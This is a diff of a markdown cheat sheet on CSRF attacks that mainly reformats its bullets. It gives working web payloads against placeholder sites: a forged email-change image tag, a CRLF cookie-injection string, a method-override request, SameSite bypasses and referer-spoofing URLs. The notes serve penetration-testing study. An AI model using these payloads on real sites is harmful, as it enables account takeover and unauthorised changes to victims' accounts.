@@ -2,15 +2,13 @@
 
 ## Conditions
 
-* A relevant action
-  * Example: change password
+* A relevant action. Ex: change password
 * Cookie-based session handling
-* No unpredictable request parameters:
-  * If you need to know the value of the existing password -> not vulnerable
+* No unpredictable request parameters. If you need to know the value of the existing password it's not vulnerable
 
 ## **Exploit**
 
-1. With POST
+**With POST**
 
 ```html
 <html>
@@ -25,7 +23,7 @@
 </html>
 ```
 
-2. With GET
+**With GET**
 
 ```html
 <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
@@ -82,19 +80,13 @@ Some applications make use of the HTTP Referer header to attempt to defend again
 
 ## CSRF tokens bypass
 
-* **Switch from POST to the GET method to bypass**
-* **Remove the entire parameter containing the token**
+* Switch from POST to the GET method to bypass
+* Remove the entire parameter containing the token
 * Sometimes you don't need a valid token (the app doesn't keep valid server-side tokens).
-  * Simply **invent a token in the required format**
-
-***
-
+  * Simply invent a token in the required format
 * Some apps don't validate if the token belongs to the same session as the requesting user.
   * Log in to the application with your account, **obtain a valid token**, and then **feed that token to the victim user** in their CSRF attack
-
-***
-
-* Some applications do tie the CSRF token to a cookie, but not to the session cookie. So there are two token: one in a cookie and one in hidden input. (this can also have the same value)
+* Some apps do tie the CSRF token to a cookie, but not to the session cookie. So there are two token: one in a cookie and one in hidden input. (this can also have the same value)
   * Can you set a cookie? Ex. Header injection with `CRLF`.&#x20;
   * ```
     /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
@@ -107,7 +99,9 @@ Some applications make use of the HTTP Referer header to attempt to defend again
 
 ## SameSite cookies bypass
 
-* Bypassing SameSite Lax restrictions using GET requests
+## Lax bypass
+
+* Using GET requests (bypass lax)
 
 ```html
 <script>
@@ -115,18 +109,15 @@ Some applications make use of the HTTP Referer header to attempt to defend again
 </script>
 ```
 
-***
-
-* Bypassing SameSite Lax restrictions using GET method override
+* GET method override (bypass lax)
   * Even if an ordinary `GET` request isn't allowed, some frameworks supports `_method` parameter. (Other frameworks support a variety of similar parameters)
   * ```http
     GET /my-account/change-email?email=a@a.com&_method=POST HTTP/1.1
     ```
 
-***
+### Strict bypass
 
-* Bypassing SameSite Strict bypass via client-side redirect
-  * Consider a page `https://vulnerable-website.com/post/confirm?postId=10` that load this script.
+Bypass via client-side redirect. Consider a page `https://vulnerable-website.com/post/confirm?postId=10` that load this script.
 
 ```javascript
 redirectOnConfirmation = () => {
@@ -148,19 +139,17 @@ Note: this attack isn't possible with server-side redirects, as browsers recogni
 
 ## Referer-based validation bypass
 
-* Validation of Referer depends on header being present
-  * Some apps validate the Referer header if present, but skip if omitted
+* Some apps validate the Referer header if present, but skip if omitted
   * `<meta name="referrer" content="never">`
-
-***
-
 * Validation of Referer can be circumvented
-  * `http://vulnerable-website.com.attacker-website.com/csrf-attack`
-  * `http://attacker-website.com/csrf-attack?vulnerable-website.com`
-  * `http://attacker-website.com/vulnerable-website.com`
-  * Note 1: add Referrer-Policy: unsafe-url
-    * One way to set it in html: `<meta name="referrer" content="unsafe-url" />`
-  * Note 2: Firefox 87 new default Referrer Policy ‘strict-origin-when-cross-origin’ trimming user sensitive information like path and query string to protect privacy. (https://blog.mozilla.org/security/2021/03/22/firefox-87-trims-http-referrers-by-default-to-protect-user-privacy/)
-  * Note 3: Instead of use http://attacker-website.com/vulnerable-website.com that looks strange you can use http://attacker-website.com/ and add `<script>history.pushState('', '', '/attacker-website.com')</script>`
+  * ```
+    http://vulnerable-website.com.attacker-website.com/csrf-attack
+    http://attacker-website.com/csrf-attack?vulnerable-website.com
+    http://attacker-website.com/vulnerable-website.com
+    ```
+  * Tip: Instead of use `http://attacker-website.com/vulnerable-website.com` that looks strange you can use `http://attacker-website.com/` and add `<script>history.pushState('', '', '/attacker-website.com')</script>`
+  *   Note: Add `Referrer-Policy: unsafe-url`. One way to set it in html: `<meta name="referrer" content="unsafe-url"/>`
 
-More info about setting Referer-Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+
+
+Firefox 87 new default Referrer Policy ‘`strict-origin-when-cross-origin`’ trimming user sensitive information like path and query string to protect privacy. (https://blog.mozilla.org/security/2021/03/22/firefox-87-trims-http-referrers-by-default-to-protect-user-privacy/)
